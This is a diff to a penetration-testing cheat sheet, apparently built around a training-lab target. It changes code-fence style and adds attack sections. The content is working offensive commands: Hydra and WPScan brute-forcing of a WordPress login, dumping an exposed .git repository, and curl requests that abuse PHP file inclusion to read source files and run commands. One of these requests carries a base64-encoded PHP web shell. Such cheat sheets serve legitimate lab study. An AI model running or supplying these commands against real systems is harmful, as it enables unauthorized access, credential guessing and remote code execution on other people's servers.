@@ -88,16 +88,30 @@ ssh -i <FILENAME> <USER>@<IP>
 
 ## Brute force(hydra)
 
-``` bash
+~~~ bash
 hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
-```
+~~~
 
 ## Brute force(wpscan)
 
-```bash
+~~~ bash
 wpscan --url http://target.com:8081 --passwords pass.txt
-```
+~~~
 
+## GitTools
+
+~~~ bash
+./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
+./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
+~~~
+
+## php://filter Wrapper
+
+~~~ bash
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+~~~
 
 # SNMP - 161
 
